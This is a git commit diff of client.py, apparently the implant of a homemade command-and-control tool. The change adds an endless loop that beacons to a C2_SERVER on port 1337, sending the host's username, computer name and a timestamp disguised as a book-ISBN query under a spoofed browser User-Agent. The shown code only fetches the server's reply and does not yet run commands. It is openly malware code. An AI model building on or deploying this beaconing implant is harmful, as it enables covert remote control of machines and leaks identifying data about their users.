9f73a1b83a1780daf197ca6025b9a4b740c83f88
byt3scr1b3 <89225495+byt3scr1b3@users.noreply.github.com>
2024-03-04 10:14:20 +0100

    Update client.py

--- client.py
+++ client.py
@@ -1,20 +1,25 @@
 from os import getenv
 
-from time import time
-from requests import get
+from time import time, sleep
+from requests import get, exceptions
 
 HEADER = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                         "Chrome/120.0.0.0 Safari/537.36"}
-
 PROXY = None
 PORT = 1337
 C2_SERVER = "localhost"
 CMD_REQUEST = "/book?isbn="
+DELAY = 3
+client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
+          str(time()))
 
-#client = (getenv("USERNAME", "Unknown_Username") + "@" + getenv("COMPUTERNAME", "Unknown_Computername") + "@" +
-          str(time())) #win<|
+# client = getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time())
 
-client = getenv("LOGNAME") + "@" + uname().nodename + "@" + str(time()) #lin<3
-
-x = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
-print(x.status_code)
+while True:
+    try:
+        command = get(f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
+        print(command.status_code)
+    except exceptions.RequestException as error:
+        print(error)
+        sleep(DELAY)
+        continue
